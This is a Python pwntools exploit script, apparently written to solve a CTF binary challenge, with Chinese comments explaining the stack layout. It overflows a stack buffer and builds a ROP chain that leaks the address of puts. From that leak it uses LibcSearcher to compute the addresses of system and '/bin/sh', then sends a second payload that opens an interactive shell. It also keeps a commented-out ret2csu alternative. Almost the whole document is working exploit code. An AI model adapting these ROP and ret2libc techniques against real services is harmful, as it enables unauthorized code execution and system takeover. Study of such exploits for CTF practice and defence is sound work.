from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'DEBUG'
context.arch = 'amd64'

p = process('../file/81f42c219e81421ebfd1bedd19cf7eff')
# p = remote('61.147.171.105', '65162')

input('continue?')

main_addr = 0x00400630
puts_plt = 0x00000000004005a0
puts_got = 0x0000000000601018
write_got = 0x0000000000601020
printf_got = 0x0000000000601028
read_got = 0x0000000000601038
pop_rdi_ret = 0x00000000004008a3
pop_4_ret = 0x000000000040089c # pop r12 r13 r14 r15 ret

'''
payload是父函数的局部变量，在跳转地址后面的栈区域，覆盖过程遇到0字节会结束，因此我们只能覆盖到跳转地址，后续的栈区域无法控制，栈结构如下：
6161616161616161
6161616161616161
6161616161616161
000000000040089c -> 覆盖返回地址，覆盖过程结束，因为第4个字节为0
6161616161616161 -> payload开始
6161616161616161
6161616161616161
000000000040089c
00000000004008a3 -> ROP开始
...
'''

def leak(address):
    payload = b'a' * 0x18 + p64(pop_4_ret) + p64(pop_rdi_ret) + p64(address) + p64(puts_plt) + p64(main_addr)
    p.sendline(payload)
    p.recvuntil(b'\x9c\x08\x40')
    value = p.recvuntil(b'\n', drop=True).ljust(8, b'\0')
    # return value[:4]
    return u64(value)

puts_addr = leak(puts_got)
obj = LibcSearcher('puts', puts_addr)
libc_base_addr = puts_addr - obj.dump('puts')
system_addr = libc_base_addr + obj.dump('system')
binsh_addr = libc_base_addr + obj.dump('str_bin_sh')
print(hex(system_addr), hex(binsh_addr))

# d = DynELF(leak, elf=ELF('../file/81f42c219e81421ebfd1bedd19cf7eff'))
# system_addr = d.lookup('system', 'libc')
# read_addr = d.lookup('read', 'libc')

'''
call_r12_ret对应指令:
mov    %r13,%rdx
mov    %r14,%rsi
mov    %r15d,%edi
callq  *(%r12,%rbx,8)
add    $0x1,%rbx
cmp    %rbp,%rbx
jne    400880 <__libc_csu_init+0x40>
add    $0x8,%rsp
pop    %rbx
pop    %rbp
pop    %r12
pop    %r13
pop    %r14
pop    %r15
retq
'''
# pop_6_ret = 0x40089a # pop rbx rbp r12 r13 r14 r15 ret
# call_r12_ret = 0x400880 
# binsh_addr = 0x00000000602100 # 任意可写的地址
# payload = flat(
#     b'a' * 0x18,
#     pop_4_ret,
#     pop_6_ret,
#     0,
#     1,
#     read_addr,
#     8,
#     binsh_addr,
#     0,
#     call_r12_ret,
#     b'\0' * 56,
#     main_addr
# )
# p.sendline(payload)
# p.sendline(b'/bin/sh\0')

payload = b'a' * 0x18 + p64(pop_4_ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload)

p.interactive()